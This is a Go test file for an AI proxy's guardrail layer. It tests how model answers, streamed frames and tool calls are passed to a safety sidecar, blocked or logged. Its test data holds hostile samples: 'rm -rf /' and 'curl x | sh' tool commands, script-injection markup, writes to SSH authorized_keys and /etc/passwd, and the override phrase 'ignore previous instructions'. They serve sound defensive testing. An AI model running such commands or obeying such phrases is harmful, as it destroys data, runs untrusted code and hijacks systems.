package app

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestResponseGuardTextKeepsProseOnly(t *testing.T) {
	body := []byte(`{"choices":[{"message":{"content":"renamed the handler","tool_calls":[{"function":{"name":"run_command","arguments":"{\"command\":\"rm -rf /\"}"}}]}}]}`)
	text := responseGuardText(body, false)
	if !strings.Contains(text, "renamed the handler") {
		t.Fatalf("text = %q, want the answer text", text)
	}
	if strings.Contains(text, "rm -rf") {
		t.Fatalf("text = %q, tool arguments must not be read as answer text", text)
	}
}

func TestResponseGuardTextDropsCode(t *testing.T) {
	cases := []struct {
		name string
		body string
		want bool
	}{
		{
			name: "markup inside a fence",
			body: "Wrap it like this:\n```html\n<script>alert(1)</script>\n```\nDone.",
			want: false,
		},
		{
			name: "markup in an inline span",
			body: "Use `<script>alert(1)</script>` in the head, then reload.",
			want: false,
		},
		{
			name: "markup in prose",
			body: "Add this to the page: <script>alert(1)</script>",
			want: true,
		},
		{
			name: "markup after an unterminated fence",
			body: "Example:\n```\ncode\n<script>alert(1)</script>",
			want: true,
		},
		{
			name: "tilde fence",
			body: "~~~\n<script>alert(1)</script>\n~~~\n",
			want: false,
		},
		{
			name: "short backtick run is not a fence",
			body: "a `` pair <script>alert(1)</script>",
			want: true,
		},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			body, err := json.Marshal(map[string]any{"choices": []any{map[string]any{"message": map[string]any{"content": testCase.body}}}})
			if err != nil {
				t.Fatal(err)
			}
			text := responseGuardText(body, false)
			if got := strings.Contains(text, "<script>"); got != testCase.want {
				t.Fatalf("text = %q, want markup present = %v", text, testCase.want)
			}
		})
	}
}

func TestStreamGuardTextKeepsFencesIntact(t *testing.T) {
	payload := "data: {\"choices\":[{\"delta\":{\"content\":\"Here:\\\\n```go\\\\n\"}}]}\n\n" +
		"data: {\"choices\":[{\"delta\":{\"content\":\"<script>alert(1)</script>\\\\n```\\\\n\"}}]}\n\n" +
		"data: [DONE]\n\n"
	text := responseGuardText([]byte(payload), true)
	if strings.Contains(text, "<script>") {
		t.Fatalf("text = %q, fenced markup must not be checked", text)
	}
	if !strings.Contains(text, "Here:") {
		t.Fatalf("text = %q, want the prose kept", text)
	}
}

func TestStreamGuardTextChecksProse(t *testing.T) {
	payload := "data: {\"choices\":[{\"delta\":{\"content\":\"Sure. <script>alert(1)</script>\"}}]}\n\n"
	if text := responseGuardText([]byte(payload), true); !strings.Contains(text, "<script>") {
		t.Fatalf("text = %q, want markup in prose kept", text)
	}
}

func TestGuardUpstreamResponseBlocks(t *testing.T) {
	sidecar := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("content-type", "application/json")
		_, _ = w.Write([]byte(`{"status":"blocked","rail":"injection detection"}`))
	}))
	defer sidecar.Close()
	original := `{"choices":[{"message":{"content":"<script>alert(1)</script>"}}]}`
	resp := &http.Response{
		StatusCode: http.StatusOK,
		Header:     http.Header{"Content-Type": {"application/json"}},
		Body:       io.NopCloser(strings.NewReader(original)),
	}
	p := &proxy{cfg: config{Guardrails: guardrailsConfig{Mode: guardrailsModeOn, Action: guardrailsActionBlock, URL: sidecar.URL}}, guardrailsClient: &http.Client{}}
	var record requestRecord
	blocked, rail, err := p.guardUpstreamResponse(context.Background(), resp, &record)
	if err != nil || !blocked || rail != "injection detection" {
		t.Fatalf("blocked=%v rail=%q err=%v", blocked, rail, err)
	}
	if record.GuardPhase != "output" || !record.GuardBlocked {
		t.Fatalf("record = %+v", record)
	}
	restored, err := io.ReadAll(resp.Body)
	if err != nil || string(restored) != original {
		t.Fatalf("body was not restored: %q err=%v", restored, err)
	}
}

func TestGuardUpstreamResponsePreservesStream(t *testing.T) {
	sidecar := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("content-type", "application/json")
		_, _ = w.Write([]byte(`{"status":"passed"}`))
	}))
	defer sidecar.Close()
	payload := strings.Repeat("data: {\"delta\":\"0123456789\"}\n\n", 2000)
	resp := &http.Response{
		StatusCode: http.StatusOK,
		Header:     http.Header{"Content-Type": {"text/event-stream"}},
		Body:       io.NopCloser(strings.NewReader(payload)),
	}
	p := &proxy{cfg: config{Guardrails: guardrailsConfig{Mode: guardrailsModeOn, Action: guardrailsActionBlock, URL: sidecar.URL}}, guardrailsClient: &http.Client{}}
	var record requestRecord
	blocked, _, err := p.guardUpstreamResponse(context.Background(), resp, &record)
	if err != nil || blocked {
		t.Fatalf("blocked=%v err=%v", blocked, err)
	}
	restored, err := io.ReadAll(resp.Body)
	if err != nil || string(restored) != payload {
		t.Fatalf("stream prefix was lost: %d bytes, want %d", len(restored), len(payload))
	}
}

func TestGuardUpstreamResponseUnavailable(t *testing.T) {
	sidecar := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
		_, _ = w.Write([]byte("sidecar exploded"))
	}))
	defer sidecar.Close()
	logs := logCapture(t)
	resp := &http.Response{StatusCode: http.StatusOK, Header: http.Header{"Content-Type": {"application/json"}}, Body: io.NopCloser(strings.NewReader(`{"x":"y"}`))}
	p := &proxy{cfg: config{Guardrails: guardrailsConfig{Mode: guardrailsModeOn, Action: guardrailsActionBlock, URL: sidecar.URL}}, guardrailsClient: &http.Client{}}
	var record requestRecord
	_, _, err := p.guardUpstreamResponse(context.Background(), resp, &record)
	if err == nil || !record.GuardUnavailable || record.GuardPhase != "output" {
		t.Fatalf("err=%v record=%+v, want unavailable", err, record)
	}
	if want := "guardrails: output check failed: check returned 500 Internal Server Error: sidecar exploded"; !strings.Contains(logs.String(), want) {
		t.Fatalf("log = %q, want %q", logs.String(), want)
	}
}

func TestVerdictLogWritesAndRotates(t *testing.T) {
	old := verdictLogMaxBytes
	verdictLogMaxBytes = 160
	t.Cleanup(func() { verdictLogMaxBytes = old })
	path := filepath.Join(t.TempDir(), "verdicts.jsonl")
	log, err := openVerdictLog(path)
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 4; i++ {
		if err := log.write(guardrailEvent{Time: time.Now(), Phase: "input", Rail: "regex check input", Model: "a/b", Action: "blocked"}); err != nil {
			t.Fatal(err)
		}
	}
	log.Close()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if len(strings.Split(strings.TrimSpace(string(data)), "\n")) >= 4 {
		t.Fatal("verdict log did not rotate")
	}
	if _, err := os.Stat(path + ".1"); err != nil {
		t.Fatalf("rotation backup missing: %v", err)
	}
	if strings.Contains(string(data), "regex check input\"") == false {
		t.Fatalf("verdict log lost the rail: %s", data)
	}
}

func TestGuardUpstreamResponsePrimeDoesNotWaitForTheLimit(t *testing.T) {
	sidecar := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("content-type", "application/json")
		_, _ = w.Write([]byte(`{"status":"passed"}`))
	}))
	defer sidecar.Close()
	old := guardResponsePrimeBudget
	guardResponsePrimeBudget = 50 * time.Millisecond
	defer func() { guardResponsePrimeBudget = old }()

	reader, writer := io.Pipe()
	resp := &http.Response{
		StatusCode: http.StatusOK,
		Header:     http.Header{"Content-Type": {"text/event-stream"}},
		Body:       reader,
	}
	p := &proxy{cfg: config{Guardrails: guardrailsConfig{Mode: guardrailsModeOn, Action: guardrailsActionBlock, URL: sidecar.URL}}, guardrailsClient: &http.Client{}}
	// The write blocks until the gate's background reader exists, so it must not
	// run on the test goroutine that is about to create that reader.
	go func() { _, _ = writer.Write([]byte("data: {\"delta\":\"first\"}\n\n")) }()
	started := time.Now()
	var record requestRecord
	blocked, _, err := p.guardUpstreamResponse(context.Background(), resp, &record)
	if err != nil || blocked {
		t.Fatalf("blocked=%v err=%v", blocked, err)
	}
	if elapsed := time.Since(started); elapsed > time.Second {
		t.Fatalf("the gate waited %s for the prefix limit instead of its budget", elapsed)
	}
	go func() {
		_, _ = writer.Write([]byte("data: {\"delta\":\"second\"}\n\n"))
		_ = writer.Close()
	}()
	restored, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatal(err)
	}
	if string(restored) != "data: {\"delta\":\"first\"}\n\ndata: {\"delta\":\"second\"}\n\n" {
		t.Fatalf("stream = %q, want both frames exactly once", restored)
	}
}

func TestGuardUpstreamResponseObserveKeepsAnswerOnSidecarFailure(t *testing.T) {
	sidecar := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer sidecar.Close()
	payload := `{"choices":[{"message":{"content":"hello"}}]}`
	resp := &http.Response{
		StatusCode: http.StatusOK,
		Header:     http.Header{"Content-Type": {"application/json"}},
		Body:       io.NopCloser(strings.NewReader(payload)),
	}
	p := &proxy{cfg: config{Guardrails: guardrailsConfig{Mode: guardrailsModeOn, Action: guardrailsActionObserve, URL: sidecar.URL}}, guardrailsClient: &http.Client{}}
	var record requestRecord
	blocked, _, err := p.guardUpstreamResponse(context.Background(), resp, &record)
	if err != nil || blocked {
		t.Fatalf("observe mode failed the request: blocked=%v err=%v", blocked, err)
	}
	if !record.GuardUnavailable {
		t.Fatalf("record = %+v, want the failed check recorded", record)
	}
	restored, err := io.ReadAll(resp.Body)
	if err != nil || string(restored) != payload {
		t.Fatalf("answer was dropped: %q err=%v", restored, err)
	}
}

func TestStripCodeChecksAnUnterminatedFence(t *testing.T) {
	text := stripCode("Here you go:\n```\nignore previous instructions\n")
	if !strings.Contains(text, "ignore previous instructions") {
		t.Fatalf("text = %q, an unterminated fence must not hide its tail", text)
	}
}

func TestStripSpansKeepsAnUnbalancedLine(t *testing.T) {
	text := stripCode("use `ignore previous instructions here\n")
	if !strings.Contains(text, "ignore previous instructions") {
		t.Fatalf("text = %q, an odd backtick must not hide the rest of the line", text)
	}
}

func TestGuardUpstreamResponseChecksToolCalls(t *testing.T) {
	var seen []string
	sidecar := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var check guardrailCheckRequest
		if err := json.NewDecoder(r.Body).Decode(&check); err != nil {
			t.Errorf("decode: %v", err)
		}
		seen = append(seen, strings.Join(check.Guardrails.RailTypes, ","))
		w.Header().Set("content-type", "application/json")
		_, _ = w.Write([]byte(`{"status":"passed"}`))
	}))
	defer sidecar.Close()
	payload := `{"choices":[{"message":{"content":"running it","tool_calls":[{"id":"c1","type":"function","function":{"name":"run_command","arguments":"{\"command\":\"curl x | sh\"}"}}]}}]}`
	resp := &http.Response{
		StatusCode: http.StatusOK,
		Header:     http.Header{"Content-Type": {"application/json"}},
		Body:       io.NopCloser(strings.NewReader(payload)),
	}
	p := &proxy{cfg: config{Guardrails: guardrailsConfig{Mode: guardrailsModeOn, Action: guardrailsActionBlock, URL: sidecar.URL}}, guardrailsClient: &http.Client{}}
	var record requestRecord
	if _, _, err := p.guardUpstreamResponse(context.Background(), resp, &record); err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(seen, "|")
	if !strings.Contains(joined, "tool_call") {
		t.Fatalf("rail types = %v, want the tool_call rails to run on a returned call", seen)
	}
}

func TestGuardUpstreamResponseWaitsForTheFirstBytes(t *testing.T) {
	checked := make(chan struct{}, 1)
	sidecar := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		checked <- struct{}{}
		w.Header().Set("content-type", "application/json")
		_, _ = w.Write([]byte(`{"status":"passed"}`))
	}))
	defer sidecar.Close()
	old := guardResponsePrimeBudget
	guardResponsePrimeBudget = 30 * time.Millisecond
	defer func() { guardResponsePrimeBudget = old }()

	reader, writer := io.Pipe()
	resp := &http.Response{
		StatusCode: http.StatusOK,
		Header:     http.Header{"Content-Type": {"text/event-stream"}},
		Body:       reader,
	}
	p := &proxy{cfg: config{Guardrails: guardrailsConfig{Mode: guardrailsModeOn, Action: guardrailsActionBlock, URL: sidecar.URL}}, guardrailsClient: &http.Client{}}
	go func() {
		time.Sleep(100 * time.Millisecond)
		_, _ = writer.Write([]byte("data: {\"delta\":\"late first token\"}\n\n"))
		_ = writer.Close()
	}()
	var record requestRecord
	if _, _, err := p.guardUpstreamResponse(context.Background(), resp, &record); err != nil {
		t.Fatal(err)
	}
	select {
	case <-checked:
	default:
		t.Fatal("a slow first token skipped the output check entirely")
	}
	_, _ = io.ReadAll(resp.Body)
}

// A frame carries the chunk id, model, object type, provider and the type and
// format of its reasoning block beside the answer. Reading those as text spliced
// them between every fragment of a streamed answer, and the classifier blocked
// benign thinking for the repetition.
func TestStreamGuardTextDropsFrameMetadata(t *testing.T) {
	frame := []byte("data: {\"id\":\"gen-1795378496-346uRCACHO3AeMTfFKD8\",\"model\":\"deepseek/deepseek-v4.1-flash-1017\",\"object\":\"chat.completion.chunk\",\"provider_name\":\"Mistral\",\"choices\":[{\"index\":0,\"delta\":{\"role\":\"assistant\",\"content\":null,\"reasoning\":\"All vhosts: desktop\",\"reasoning_details\":[{\"type\":\"reasoning.text\",\"text\":\"All vhosts: desktop\",\"format\":\"unknown\"}]}}]}\n\n")
	text := strings.TrimSpace(streamGuardText(frame))
	if text != "All vhosts: desktop" {
		t.Fatalf("text = %q, want the delta text only", text)
	}
	for _, metadata := range []string{"gen-", "deepseek/", "chat.completion.chunk", "Mistral", "reasoning.text", "unknown", "assistant"} {
		if strings.Contains(text, metadata) {
			t.Fatalf("text = %q, frame metadata %q reached the rails", text, metadata)
		}
	}
}

// The same metadata surrounds a completed body, where a choice carries a message
// instead of a delta.
func TestResponseGuardTextDropsFrameMetadata(t *testing.T) {
	body := []byte(`{"id":"gen-1","model":"deepseek/deepseek-v4.1-flash-1017","object":"chat.completion","provider_name":"Mistral","choices":[{"index":0,"message":{"role":"assistant","content":"the answer","reasoning":"the thought","reasoning_details":[{"type":"reasoning.text","text":"the thought","format":"unknown"}]}}]}`)
	text := responseGuardText(body, false)
	if !strings.Contains(text, "the answer") || !strings.Contains(text, "the thought") {
		t.Fatalf("text = %q, want the message content and reasoning", text)
	}
	if strings.Count(text, "the thought") != 1 {
		t.Fatalf("text = %q, reasoning was read more than once", text)
	}
	for _, metadata := range []string{"gen-1", "deepseek/", "chat.completion", "Mistral", "reasoning.text", "unknown", "assistant"} {
		if strings.Contains(text, metadata) {
			t.Fatalf("text = %q, frame metadata %q reached the rails", text, metadata)
		}
	}
}

// A legacy completion keeps its answer in choices[].text, which is still checked
// after the frame metadata is dropped.
func TestResponseGuardTextKeepsLegacyCompletionText(t *testing.T) {
	body := []byte(`{"id":"cmpl-1","object":"text_completion","model":"gpt-3.5-turbo-instruct","choices":[{"index":0,"text":"rename the handler"}]}`)
	if text := responseGuardText(body, false); !strings.Contains(text, "rename the handler") {
		t.Fatalf("text = %q, want the completion text", text)
	}
}

// The proxy forwards /v1/messages and the Responses API as well, so their text
// has to survive the metadata filter too.
func TestStreamGuardTextKeepsOtherProtocols(t *testing.T) {
	anthropic := "data: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"both vhosts\"}}\n\n"
	if text := strings.TrimSpace(streamGuardText([]byte(anthropic))); text != "both vhosts" {
		t.Fatalf("anthropic text = %q, want the delta text", text)
	}
	responses := "data: {\"type\":\"response.output_text.delta\",\"item_id\":\"msg_1\",\"output_index\":0,\"delta\":\"titles were stale\"}\n\n"
	if text := strings.TrimSpace(streamGuardText([]byte(responses))); text != "titles were stale" {
		t.Fatalf("responses text = %q, want the delta text", text)
	}
}

func TestStripCodeDoesNotRecheckClosedFences(t *testing.T) {
	text := stripCode("Example:\n```html\n<script>alert(1)</script>\n```\nThen:\n```\nstill open")
	if strings.Contains(text, "<script>") {
		t.Fatalf("a closed fence body leaked into the checked text: %q", text)
	}
	if !strings.Contains(text, "still open") {
		t.Fatalf("the open fence tail was dropped: %q", text)
	}
}

// A streamed tool call whose arguments the prime window cut in half must not be
// sent to the sidecar: it cannot be parsed, and NeMo answers with a block that
// names no rail, which reached the log as GUARD BLOCKED with no reason.
func TestCompleteToolCallsJudgesTruncatedStreamCall(t *testing.T) {
	frames := strings.Join([]string{
		`data: {"choices":[{"index":0,"delta":{"tool_calls":[{"index":0,"id":"call_1","function":{"name":"read_file","arguments":"{\"path\":"}}]}}]}`,
		"",
	}, "\n")
	calls := streamToolCalls([]byte(frames))
	if len(calls) != 1 {
		t.Fatalf("streamToolCalls returned %d calls, want 1", len(calls))
	}
	got := completeToolCalls(calls, true)
	if len(got) != 1 {
		t.Fatalf("a truncated call was dropped unchecked: %+v", got)
	}
	if got[0].Function.Arguments != `{"path":""}` {
		t.Fatalf("arguments = %q, want an empty path the rails can read", got[0].Function.Arguments)
	}

	complete := strings.Replace(frames, `"{\"path\":"`, `"{\"path\":\"main.go\"}"`, 1)
	complete += "}\n"
	calls = streamToolCalls([]byte(complete))
	if len(calls) != 1 {
		t.Fatalf("streamToolCalls returned %d calls, want 1", len(calls))
	}
	kept := completeToolCalls(calls, true)
	if len(kept) != 1 {
		t.Fatalf("a complete call was dropped: %+v", calls)
	}
	if kept[0].Function.Arguments != `{"path":"main.go"}` {
		t.Fatalf("arguments = %q, want the complete object", kept[0].Function.Arguments)
	}
}

// The value the rails read is taken from the visible prefix, including one the
// window cut in half, and falls back to the visible text when the provider put
// the field beyond the cut.
func TestPartialToolArgumentsJudgesWhatTheWindowSaw(t *testing.T) {
	for _, test := range []struct {
		name      string
		tool      string
		arguments string
		want      string
	}{
		{
			name:      "cut path",
			tool:      "write_file",
			arguments: `{"file_path":"/home/u/.ssh/authorized_keys`,
			want:      `{"path":"/home/u/.ssh/authorized_keys"}`,
		},
		{
			name:      "path before a huge body",
			tool:      "write_file",
			arguments: `{"path":"/etc/passwd","content":"` + strings.Repeat("x", 4000),
			want:      `{"path":"/etc/passwd"}`,
		},
		{
			name:      "path behind the cut",
			tool:      "write_file",
			arguments: `{"content":"` + strings.Repeat("x", 4000),
			want:      `{"path":"{\"content\":\"` + strings.Repeat("x", 4000) + `"}`,
		},
		{
			name:      "unknown class has no rail",
			tool:      "web_search",
			arguments: `{"query":"hi`,
			want:      ``,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			if got := partialToolArguments(test.tool, test.arguments); got != test.want {
				t.Fatalf("arguments = %q, want %q", got, test.want)
			}
		})
	}
}

// A non-streaming body is read in full, so a call there that does not parse is
// a real anomaly and must still reach the rails.
func TestCompleteToolCallsKeepsNonStreamingCalls(t *testing.T) {
	calls := []rawToolCall{{ID: "c1", Type: "function"}}
	calls[0].Function.Name = "run_command"
	calls[0].Function.Arguments = `{"command":"ls"`
	if got := completeToolCalls(calls, false); len(got) != 1 {
		t.Fatalf("a non-streaming call was dropped: %+v", got)
	}
}

func TestGuardrailUnnamedRailNamesTheBlock(t *testing.T) {
	for _, test := range []struct {
		name   string
		rail   string
		reason string
		want   string
	}{
		{"declared rail wins", "regex check output", "anything", "regex check output"},
		{"manager block", "", "tool call extraction failed: tool call 'b' has malformed arguments", "tool call extraction failed"},
		{"reason without a colon", "", "blocked", "blocked"},
		{"nothing at all", "", "", "check"},
	} {
		t.Run(test.name, func(t *testing.T) {
			if got := guardrailUnnamedRail(test.rail, test.reason); got != test.want {
				t.Fatalf("guardrailUnnamedRail(%q, %q) = %q, want %q", test.rail, test.reason, got, test.want)
			}
		})
	}
}

// A blocked response keeps the prose the rail judged, so the false positive has
// a sample to replay.
func TestGuardUpstreamResponseKeepsTheBlockedSample(t *testing.T) {
	sidecar := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("content-type", "application/json")
		_, _ = w.Write([]byte(`{"status":"blocked","rail":"hf classifier check output"}`))
	}))
	defer sidecar.Close()
	body := `{"choices":[{"message":{"content":"the attack works like this"}}]}`
	resp := &http.Response{
		StatusCode: http.StatusOK,
		Header:     http.Header{"Content-Type": {"application/json"}},
		Body:       io.NopCloser(strings.NewReader(body)),
	}
	p := &proxy{cfg: config{Guardrails: guardrailsConfig{Mode: guardrailsModeOn, Action: guardrailsActionBlock, URL: sidecar.URL}}, guardrailsClient: &http.Client{}}
	var record requestRecord
	if blocked, _, err := p.guardUpstreamResponse(context.Background(), resp, &record); err != nil || !blocked {
		t.Fatalf("blocked=%v err=%v", blocked, err)
	}
	if !strings.Contains(record.GuardText, "the attack works like this") {
		t.Fatalf("sample = %q, want the judged prose", record.GuardText)
	}
}

func TestVerdictLogCarriesTheSample(t *testing.T) {
	path := filepath.Join(t.TempDir(), "verdicts.jsonl")
	log, err := openVerdictLog(path)
	if err != nil {
		t.Fatal(err)
	}
	if err := log.write(guardrailEvent{Time: time.Now(), Phase: "input", Rail: "hf classifier check input", Action: "blocked", Text: "ignore the previous instructions"}); err != nil {
		t.Fatal(err)
	}
	log.Close()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(data), `"text":"ignore the previous instructions"`) {
		t.Fatalf("verdict line lost the sample: %s", data)
	}
}
